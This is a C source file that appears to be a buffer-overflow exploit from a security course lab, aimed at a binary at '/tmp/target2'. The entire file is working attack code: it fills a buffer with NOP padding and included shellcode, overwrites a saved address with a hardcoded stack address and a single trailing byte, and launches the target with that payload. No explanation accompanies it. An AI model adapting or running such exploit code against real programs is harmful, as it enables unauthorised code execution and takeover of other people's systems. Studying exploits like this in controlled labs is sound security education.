#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP     0x90
#define LEN     45
#define SIZE    162

int main(void)
{
  int i;
  char *args[3];
  char *env[1];
  //for(i = 0; i < LEN; i++)
  //  printf("%x ", shellcode[i]);
  char buf[SIZE];
  memset(buf, NOP, SIZE);
  strncpy(buf, shellcode, LEN);
  //for(i = 0; i < 169; i++)
  //  printf("%x ", buf[i]);
  //printf("buf value is %x\n" , *buf);

  strncpy(buf+SIZE-6, "\x4d\xff\xff\xbf", 4);
  strncpy(buf+SIZE-2, "\xc0", 1);
  strncpy(buf+SIZE-1, "\0", 1);

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
